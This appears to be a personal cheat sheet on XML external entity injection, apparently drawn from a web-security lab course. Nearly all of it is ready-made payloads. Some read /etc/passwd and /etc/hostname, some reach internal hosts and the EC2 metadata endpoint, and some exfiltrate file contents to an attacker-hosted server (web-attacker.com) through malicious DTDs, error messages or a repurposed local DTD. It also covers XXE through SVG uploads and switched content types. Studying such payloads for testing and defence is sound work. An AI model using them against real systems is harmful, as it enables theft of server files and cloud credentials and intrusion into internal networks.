# XML external entity injection
## File read
To exploit XXE we need to:
* Create or change DOCTYPE that defines external entity
* Edit a data which is returned back in app's response in order to use defined entity
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```
Change it to:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
We define external entity `xxe` which contains /etc/passwd file and then pass this entity into application response  

## XXE to SSRF
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```
We can try to access EC2 metadata endpoint with this attack (http://169.254.169.254/latest/meta-data/)

## Blind XXE
We can use XInclude when we don't contol entire XML document and can't create or modify DOCTYPE entity
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

### XXE SSRF
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

### Input validation bypass
One way of bypassing input restriction is using xml parameter entities. Such entities could be mentioned only inside of DTD (doctype).
Syntax:
```
<!ENTITY % myparameterentity "my parameter entity value" >
```
Here we declare `myparameterentity` with some value and then we can mention it like this:
```
%myparameterentity;
```
Example of attack with XML parameter entity:
```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

### OAST XXE data exfiltration
To exploit blind XXE, attacker must host some webserver and upload on it malicious XXE entity:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
 This DTD carries out the following steps:

* Defines an XML parameter entity called `file`, containing the contents of the /etc/passwd file.
* Defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `exfiltrate`. The `exfiltrate` entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the file entity within the URL query string.
* Uses the `eval` entity, which causes the dynamic declaration of the exfiltrate entity to be performed.
* Uses the `exfiltrate` entity, so that its value is evaluated by requesting the specified URL.

This file with malicious entities attacker must host on some url such as
```
http://web-attacker.com/malicious.dtd
```
And finalyy attacker must send XXE payload to a target:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```

### EXfiltrating data via errors 
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
This malicious DTD must be placed on webserver controlled by hacker. Attack scenario is same as in previous section.
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ab800b5040218e6807fd99d013300dd.exploit-server.net/exploit"> %xxe;]>
```

In such case we can get contents of existing file (/etc/passwd) from error which arises because of requesting unexisting file  
In such case error will look like:
```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

### Repurposing a local DTD
We can redefine some entity in .dtd file on local system and receive error-based output of interesting file
```
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
Here we are referring to docbookx.dtd file and redefine ISOamso entity



## XXE via file upload
We can upload malicious SVG or DOC file containing XXE.
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

## XXE via modified content-type
We can modify content-type of POST requests in order to put some XML request in palce of original
For example we can change this:
```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
To this:
```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
If application tolerates such input and parsews it, we possibly could be able to access hidden XXE attack.

